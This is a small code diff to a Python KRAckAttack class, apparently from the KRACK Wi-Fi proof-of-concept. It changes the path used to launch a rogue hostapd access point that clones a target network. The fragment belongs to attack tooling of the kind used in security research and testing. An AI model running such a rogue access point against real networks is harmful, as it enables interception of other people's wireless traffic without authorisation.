@@ -921,7 +921,7 @@ class KRAckAttack():
 		# Set up a rouge AP that clones the target network (don't use tempfile - it can be useful to manually use the generated config)
 		with open("hostapd_rogue.conf", "w") as fp:
 			fp.write(self.netconfig.write_config(self.nic_rogue_ap))
-		self.hostapd = subprocess.Popen(["../hostapd", "hostapd_rogue.conf", "-dd", "-K"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+		self.hostapd = subprocess.Popen(["/krackattacks-poc-zerokey/hostapd", "hostapd_rogue.conf", "-dd", "-K"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 		self.hostapd_log = open("hostapd_rogue.log", "w")
 
 		log(STATUS, "Giving the rogue hostapd one second to initialize ...")
